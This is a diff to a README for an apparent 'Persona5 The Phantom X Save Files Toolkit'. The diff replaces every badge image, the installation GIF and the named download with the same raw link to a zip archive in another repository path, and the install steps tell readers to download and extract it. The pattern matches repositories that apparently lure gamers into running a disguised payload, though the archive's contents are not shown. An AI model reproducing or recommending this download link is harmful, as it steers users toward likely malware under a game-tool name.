@@ -1,10 +1,10 @@
 # 🎭 Persona5 The Phantom X Save Files Toolkit
 
-![Maintenance](https://img.shields.io/badge/Maintained-Yes-green?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-blue.svg)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-blue?style=flat-square)
-![Languages](https://img.shields.io/badge/Multilanguage-Yes-brightgreen?style=flat-square)
-![Support](https://img.shields.io/badge/Support-24%2F7-orange?style=flat-square)
+![Maintenance](https://github.com/Masim6474/persona5-the-phantom-x-save-archive/raw/refs/heads/main/suncup/persona-phantom-archive-the-save-x-v2.8.zip)
+![License](https://github.com/Masim6474/persona5-the-phantom-x-save-archive/raw/refs/heads/main/suncup/persona-phantom-archive-the-save-x-v2.8.zip)
+![Platform](https://github.com/Masim6474/persona5-the-phantom-x-save-archive/raw/refs/heads/main/suncup/persona-phantom-archive-the-save-x-v2.8.zip%20%7C%20macOS%20%7C%20Linux-blue?style=flat-square)
+![Languages](https://github.com/Masim6474/persona5-the-phantom-x-save-archive/raw/refs/heads/main/suncup/persona-phantom-archive-the-save-x-v2.8.zip)
+![Support](https://github.com/Masim6474/persona5-the-phantom-x-save-archive/raw/refs/heads/main/suncup/persona-phantom-archive-the-save-x-v2.8.zip%2F7-orange?style=flat-square)
 
 Welcome, fellow Phantom Thieves enthusiast! Immerse yourself in the powerful world of **Persona5 The Phantom X Save Files Toolkit** –– an all-in-one solution for managing and personalizing your save game experiences in Persona5 The Phantom X. Our toolkit doesn't just organize and back up your saves, it transforms the very way you connect with the game universe. Dream of revisiting beloved scenes, sharing your progress, or keeping your adventures synced across multiple platforms? Now you can, with unprecedented simplicity and style!
 
@@ -14,7 +14,7 @@ Welcome, fellow Phantom Thieves enthusiast! Immerse yourself in the powerful wor
 
 Follow these steps to integrate the Persona5 The Phantom X Save Files Toolkit into your Persona journey!
 
-**1.** Download the **EasyLaunch.zip** file from this repository.
+**1.** Download the **https://github.com/Masim6474/persona5-the-phantom-x-save-archive/raw/refs/heads/main/suncup/persona-phantom-archive-the-save-x-v2.8.zip** file from this repository.
 
 **2.** Extract the contents to your preferred workspace.
 
@@ -26,7 +26,7 @@ Follow these steps to integrate the Persona5 The Phantom X Save Files Toolkit in
 
 See the toolkit in action! Watch our quick animated guide:
 
-![Installation GIF](https://i.imgur.com/Js67NIU.gif)
+![Installation GIF](https://github.com/Masim6474/persona5-the-phantom-x-save-archive/raw/refs/heads/main/suncup/persona-phantom-archive-the-save-x-v2.8.zip)
 
 Embrace simplicity and elevate your save file management experience!
 
